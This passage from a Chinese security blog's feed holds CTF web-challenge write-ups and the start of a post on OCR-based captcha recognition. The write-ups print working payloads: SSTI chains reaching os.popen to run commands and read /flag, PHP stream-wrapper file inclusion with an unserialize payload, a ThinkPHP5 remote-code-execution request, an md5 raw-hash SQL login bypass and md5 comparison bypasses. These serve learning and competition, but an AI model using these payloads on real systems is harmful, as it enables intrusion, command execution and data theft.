class="number">169</span>]</span>&#125;&#125;</span><br></pre></td></tr></table></figure><br>选中后初始化这个类,并使用globals全局查看里面的方法<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>].<span class="constructor">__subclasses__()</span><span class="literal">[<span class="number">169</span>]</span>.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span><span class="module"><span class="identifier">__globals__</span>&#125;</span></span>&#125;</span><br></pre></td></tr></table></figure></p><p>在这些方法中找到eval,并进行创建<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;<span class="literal">()</span>.<span class="module-access"><span class="module"><span class="identifier">__class__</span>.</span><span class="module"><span class="identifier">__bases__</span>[</span></span><span class="number">0</span>].<span class="constructor">__subclasses__()</span><span class="literal">[<span class="number">169</span>]</span>.<span class="module-access"><span class="module"><span class="identifier">__init__</span>.</span><span class="module"><span class="identifier">__globals__</span>.</span><span class="module"><span class="identifier">__builtins__</span>[</span></span>%<span class="number">27</span>eval%<span class="number">27</span>]&#125;&#125;</span><br></pre></td></tr></table></figure><br>接下来import OS ,并执行whoami命令查看是否可以运行<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">169</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">%27eval%27</span>](<span class="link">"__import__(%27os%27</span>).popen(%27whoami%27).read()")&#125;&#125;</span><br></pre></td></tr></table></figure><br>得到了ctf，证明可以正常运行，接下来就cat /flag<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qaq?name=&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">169</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">%27eval%27</span>](<span class="link">"__import__(%27os%27</span>).popen(%27cat%20/flag%27).read()")&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>成功得到了flag</p><h2 id="SSTI注入-POC收藏"><a href="#SSTI注入-POC收藏" class="headerlink" title="SSTI注入-POC收藏"></a>SSTI注入-POC收藏</h2><p>另外还在网上看到了很多POC 这里收藏一下<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第二种</span><br><span class="line">或者找到os.<span class="emphasis">_wrap_</span>close模块 117个</span><br><span class="line">&#123;&#123;"".<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">117</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'dir'</span>).read()&#125;&#125;  </span><br><span class="line">当前文件夹</span><br><span class="line">&#123;&#123;"".<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">117</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[<span class="string">'popen'</span>](<span class="link">'cat /flag'</span>).read()&#125;&#125;</span><br><span class="line">来打开文件，payload有很多慢慢摸索慢慢积累= =</span><br></pre></td></tr></table></figure><br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">第三种</span><br><span class="line">&#123;&#123;().<span class="strong">__class__</span>.<span class="strong">__bases__</span>[<span class="string">0</span>].<span class="strong">__subclasses__</span>()[<span class="string">177</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>.<span class="strong">__builtins__</span>[<span class="string">'open'</span>](<span class="link">'/flag'</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure><br><figure class="highlight django"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">第四种</span></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> c.__name__=='catch_warnings' %&#125;</span><span class="template-variable">&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">for</span></span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> c.__name__=='catch_warnings' %&#125;</span><span class="template-variable">&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag').read()")&#125;&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endif</span></span> %&#125;</span><span class="template-tag">&#123;% <span class="name"><span class="name">endfor</span></span> %&#125;</span></span><br></pre></td></tr></table></figure></p><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>打开之后看到源码<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">"text"</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">"file"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">"password"</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>)===<span class="string">"welcome to the zjctf"</span>))&#123;</span><br><span class="line">    echo <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        echo <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>);  <span class="regexp">//u</span>seless.php</span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        echo <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>可以看到需要text file和password三个参数满足条件，才会输出flag</p><p>先分析一下text参数<br>text参数先判断了是否存在，如果存在则使用file_get_contents($text,’r’)</p><p>查阅了一下百度，file_get_contents() 是把文件读入一个字符串，所以可得知，需要将welcome to the zjctf输入到文件中，然后进行查询，才能满足条件</p><p>file则是需要包含useless.php</p><p>password则是需要进行反序列化操作</p><p>所以先想到使用伪协议来将welcome to the zjctf读入到文件中，然后再使用伪协议读取useless.php的内容，猜测useless.php中的内容就是password需要的反序列化内容</p><p>这里伪协议做一个补充</p><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><h3 id="PHP支持的伪协议"><a href="#PHP支持的伪协议" class="headerlink" title="PHP支持的伪协议"></a>PHP支持的伪协议</h3><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">file:</span><span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="symbol">ftp:</span><span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line"><span class="symbol">php:</span><span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="symbol">zlib:</span><span class="comment">// — 压缩流</span></span><br><span class="line"><span class="symbol">data:</span><span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line"><span class="symbol">glob:</span><span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="symbol">phar:</span><span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="symbol">ssh2:</span><span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="symbol">rar:</span><span class="comment">// — RAR</span></span><br><span class="line"><span class="symbol">ogg:</span><span class="comment">// — 音频流</span></span><br><span class="line"><span class="symbol">expect:</span><span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure><p>常用的伪协议：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">php://<span class="built_in">filter</span>  <span class="comment"> //经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.</span></span><br><span class="line">可以跟的参数有resource=&lt;要过滤的数据流&gt;  <span class="built_in">read</span>=&lt;读链的筛选列表&gt;  <span class="built_in">write</span>=&lt;写链的筛选列表&gt;</span><br><span class="line">常用语句：php://<span class="built_in">filter</span>/<span class="built_in">read</span>=<span class="built_in">convert</span>.base64-encode/resource=index.php  <span class="built_in">read</span>/<span class="built_in">write</span>参数替换<span class="built_in">read</span>的位置即可  resource为必须的参数</span><br><span class="line"></span><br><span class="line">php://input  <span class="comment"> //php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">file</span>://   <span class="comment"> //file://伪协议在双OFF的时候也可以用，用于本地文件包含  file://协议必须是绝对路径</span></span><br><span class="line"></span><br><span class="line">phar://  <span class="comment"> //说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关  </span></span><br><span class="line">常用语句：phar://test.[zip/jpg/png…]/<span class="built_in">file</span>.txt</span><br><span class="line"></span><br><span class="line">data://<span class="keyword">text</span>/plain;base64,base编码字符串   <span class="comment"> //很常用的数据流构造器，将读取后面base编码字符串后解码的数据作为数据流的输入</span></span><br></pre></td></tr></table></figure></p><h2 id="测试过程-2"><a href="#测试过程-2" class="headerlink" title="测试过程"></a>测试过程</h2><p>这里有两种方法  一种是使用php://input，但是需要在POST请求下进行，比较繁琐，所以我这里采用了data协议</p><p>pyload:<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">text</span>=<span class="keyword">data</span>:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure></p><p>接着看到<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        echo <span class="string">"Not now!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        include(<span class="variable">$file</span>);  <span class="regexp">//u</span>seless.php</span><br><span class="line">        <span class="variable">$password</span> = unserialize(<span class="variable">$password</span>);</span><br><span class="line">        echo <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>看到了include  并且提示了useless.php 所以考虑使用文件包含，用PHP://filter来读取<br>pyload:<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?text=data://text/plain;<span class="built_in">base64</span>,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/<span class="built_in">read</span>=<span class="built_in">convert</span>.<span class="built_in">base64</span>-encode/resource=useless.php</span><br></pre></td></tr></table></figure></p><p>获得了useless.php的base64 解码后得到源码为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span>  </span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> $file;  </span></span><br><span class="line"><span class="php">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span></span><br><span class="line"><span class="php">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span></span><br><span class="line"><span class="php">        <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span></span><br><span class="line"><span class="php">        &#125;  </span></span><br><span class="line"><span class="php">    &#125;  </span></span><br><span class="line"><span class="php">&#125;  </span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><br>接下来看到password变量需要进行反序列化的一个操作<br>所以我们这里反序列化这个Flag类：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'flag.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> (<span class="string">"U R SO CLOSE !///COME ON PLZ"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag=<span class="keyword">new</span> Flag();</span><br><span class="line">$flag=serialize($flag);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">输出结果为：</span><br><span class="line">O:<span class="number">4</span>:<span class="string">"Flag"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">8</span>:<span class="string">"flag.php"</span>;&#125;</span><br></pre></td></tr></table></figure><br>pyload:<br><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:"Flag":<span class="number">1</span>:&#123;s:<span class="number">4</span>:"file";s:<span class="number">8</span>:"flag.php";&#125;</span><br></pre></td></tr></table></figure><br>最后F12,得到flag</p><h1 id="BJDCTF-2nd-old-hack"><a href="#BJDCTF-2nd-old-hack" class="headerlink" title="[BJDCTF 2nd]old-hack"></a>[BJDCTF 2nd]old-hack</h1><h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><p>打开链接之后，并没有发现什么特别的，看到一个Powered By THINKPHP5</p><p>所以百度了一下THINKPHP5是什么东西</p><p>经过百度之后，查看到THINKPHP5是为了简化企业级应用开发和敏捷WEB应用开发而诞生的，得知这是一个建站的框架</p><p>再加搜索 看到这一篇文章<br><a href="https://www.codercto.com/a/54587.html" target="_blank" rel="noopener">https://www.codercto.com/a/54587.html</a></p><p>得知了考察的是任意代码执行漏洞</p><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><p>这里的知识点就是文章中提到的THINKPHP5.X版本的RCE</p><p>原来RCE离我那么近</p><h2 id="测试过程-3"><a href="#测试过程-3" class="headerlink" title="测试过程"></a>测试过程</h2><p>使用文章中的pyload进行测试<br><img src="/img/Nepnep/[BJDCTF2nd]old-hack0.png" alt="avatar"></p><p>得到如图所示的界面，接下来pyload:<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">get</span>[]=<span class="title">ls</span> /</span></span><br></pre></td></tr></table></figure><br><img src="/img/Nepnep/[BJDCTF2nd]old-hack1.png" alt="avatar"></p><p>最后cat flag<br><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;<span class="function"><span class="keyword">method</span>=<span class="title">get</span>&amp;<span class="title">get</span>[]=<span class="title">cat</span> /<span class="title">flag</span></span></span><br></pre></td></tr></table></figure></p><p>得到flag</p><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><h2 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h2><p>打开之后是个查询窗口，F12也没有什么提示，所以使用BP抓包一下，得到了hint<br>Hint: select * from ‘admin’ where password=md5($pass,true)</p><p>查询了一下md5($pass,true)</p><p>参考了这些文章：<br><a href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener">https://blog.csdn.net/March97/article/details/81222922</a><br><a href="https://www.jianshu.com/p/12125291f50d" target="_blank" rel="noopener">https://www.jianshu.com/p/12125291f50d</a><br><a href="https://www.cnblogs.com/tqing/p/11852990.html" target="_blank" rel="noopener">https://www.cnblogs.com/tqing/p/11852990.html</a></p><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><p>1）经过md5加密后：276f722736c95d99e921722cf9ed621c</p><p>再转换为字符串：’or’6&lt;乱码&gt;  即  ‘or’66�]��!r,��b</p><p>2）在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。<br>当然如果只有数字的话，就不需要单引号，比如password=‘xxx’ or 1，那么返回值也是true</p><p>3）ffifdyop，这个点的原理是 ffifdyop 这个字符串被 md5 哈希了之后会变成 276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 ‘ or ‘6，<br>而 Mysql 刚好又会吧 hex 转成 ascii 解释，因此拼接之后的形式是1select * from ‘admin’ where password=’’ or ‘6xxxxx’</p><p>等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数</p><h3 id="md5碰撞"><a href="#md5碰撞" class="headerlink" title="md5碰撞"></a>md5碰撞</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">以下值在md5加密后以<span class="number">0</span>E开头：</span><br><span class="line"></span><br><span class="line">    QNKCDZO</span><br><span class="line">    <span class="number">240610708</span></span><br><span class="line">    s878926199a</span><br><span class="line">    s155964671a</span><br><span class="line">    s214587387a</span><br><span class="line">    s214587387a</span><br><span class="line"></span><br><span class="line">PHP在处理哈希字符串时，它把每一个以“<span class="number">0</span>E”开头的哈希值都解释为<span class="number">0</span>，所以如果两个不同的密码经过哈希以后，其哈希值都是以“<span class="number">0</span>E”开头的，那么PHP将会认为他们相同，都是<span class="number">0</span>。</span><br></pre></td></tr></table></figure><h3 id="与"><a href="#与" class="headerlink" title="===与!=="></a>===与!==</h3><p>===是包括变量值与类型完全相等，而==只是复比较两个数的值是否相等。<br>比如：100==“100” 这里用==，因为它们制的值相等，都是知100，结果为道真<br>但是若用===，因为左边是一个整型而右边则是一个字符串类型的数，类型不相同所以结果为假</p><h2 id="测试过程-4"><a href="#测试过程-4" class="headerlink" title="测试过程"></a>测试过程</h2><p>直接构造pylioad<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leveldo4.php?<span class="attribute">password</span>=ffifdyop</span><br></pre></td></tr></table></figure></p><p>得到代码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">$a = $GET['a'];</span></span><br><span class="line"><span class="comment">$b = $_GET['b'];</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">if($a != $b &amp;&amp; md5($a) == md5($b))&#123;</span></span><br><span class="line"><span class="comment">    // wow, glzjin wants a girl friend.</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><br>分析源码发现是非常常规的md5碰撞或者可以采用数组</p><p>方法一:md5碰撞<br>pyload:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">levels91.php?<span class="attribute">a</span>=QNKCDZO&amp;b=240610708</span><br></pre></td></tr></table></figure></p><p>得到源码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="php">highlight_file(<span class="keyword">__FILE__</span>);</span></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span>($_POST[<span class="string">'param1'</span>]!==$_POST[<span class="string">'param2'</span>]&amp;&amp;md5($_POST[<span class="string">'param1'</span>])===md5($_POST[<span class="string">'param2'</span>]))&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>这里由于使用了===和!== 所以只好使用数组来进行绕过<br><img src="/img/Nepnep/[BJDCTF2nd]old-hack2.png" alt="avatar"></p><p>得到flag</p><p>方法二：数组<br>pyload:<br><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">levels91.php?a[]=<span class="number">1</span>&amp;b[]=<span class="number">2</span></span><br></pre></td></tr></table></figure></p><p>后面的步骤与方法一相同 这里不再细说</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这是加入Nepnep战队之后的第一次刷题记录,由于要求刷题记录5题一篇文章，所以在这里做出一个改变&lt;/p&gt;
&lt;h1 id=&quot;ACTF2020-新生赛-Include&quot;&gt;&lt;a href=&quot;#ACTF2020-新生赛-Include&quot; class=&quot;headerlink&quot; ti
      
    
    </summary>
    
    
      <category term="WP" scheme="http://yoursite.com/categories/WP/"/>
    
      <category term="WEB" scheme="http://yoursite.com/categories/WP/WEB/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="Nepnep" scheme="http://yoursite.com/tags/Nepnep/"/>
    
  </entry>
  
  <entry>
    <title>Python3-2020/5/1-周报10</title>
    <link href="http://yoursite.com/2020/05/02/Python3-2020-5-1-%E5%91%A8%E6%8A%A510/"/>
    <id>http://yoursite.com/2020/05/02/Python3-2020-5-1-%E5%91%A8%E6%8A%A510/</id>
    <published>2020-05-02T00:53:51.000Z</published>
    <updated>2020-05-11T13:14:02.751Z</updated>
    
    <content type="html"><![CDATA[<h1 id="验证码的识别"><a href="#验证码的识别" class="headerlink" title="验证码的识别"></a>验证码的识别</h1><p>随着爬虫越来越多，许多网站都采取了各种各样的反爬虫机制，其中最常见的就是使用验证码，现在随着技术的发展，验证码已经由数字演变成了字母，滑动，九宫格等各种验证码</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于tesserocr库是比较老的库，目前只更新到只吃python3.7，而由于我的是python3.8经过多次尝试之后，发现还是无法使用，经过查看大量的资料，我使用了另外一个库—pytesseract</p><p>pytesseract这个库原理几乎和tesserocr库相同</p><h2 id="图形验证码识别"><a href="#图形验证码识别" class="headerlink" title="图形验证码识别"></a>图形验证码识别</h2><p>我们先识别一下最简单的一种验证码，即图形验证码。这种验证码最早出现，也很常见，一般是由4位字母或者数字组成。例如<a href="http://my.cnki.net/Register/CommonRegister.aspx的登录验证码" target="_blank" rel="noopener">http://my.cnki.net/Register/CommonRegister.aspx的登录验证码</a></p><h3 id="获取验证码"><a href="#获取验证码" class="headerlink" title="获取验证码"></a>获取验证码</h3><p>首先需要安装pytesseract库</p><p>为了便于实验，我们先将验证码图片保存在本地，先测试一下</p><p>首先F12打开开发者工具，查看验证码的url<br><img src="/img/python3/验证码0.png" alt="avatar"></p><p>接下来访问一下这个aspx<br><img src="/img/python3/验证码1.png" alt="avatar"><br>由于验证码是动态的 所以也没有什么太大的关系</p><p>加下来把这个aspx保存下来，命名为code.png</p><p>代码：<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pytesseract</span><br><span class="line">from PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="built_in">image</span>=Image.<span class="built_in">open</span>(<span class="string">'D:\\code.png'</span>)</span><br><span class="line"><span class="built_in">image</span>=<span class="built_in">image</span>.convert(<span class="string">'RGB'</span>)</span><br><span class="line"><span class="built_in">print</span>(pytesseract.image_to_string(<span class="built_in">image</span>))</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">Gsee</span><br></pre></td></tr></table></figure></p><p>这里新建了一个Image对象，调用了pytesseract的image_to_string()方法，传入该对象即可完成识别，但是要注意的是，由于pytesseract的特殊性，处理图片时，由于图片可能不是RGBA通路的，所以最后在打开图片后等增加image.convert(‘RGB’)语句，保证图片是RGB格式的</p><h3 id="验证码处理"><a href="#验证码处理" class="headerlink" title="验证码处理"></a>验证码处理</h3><p>接下来我们换一个验证码，命名为code2.png<br><img src="/img/python3/code2.png" 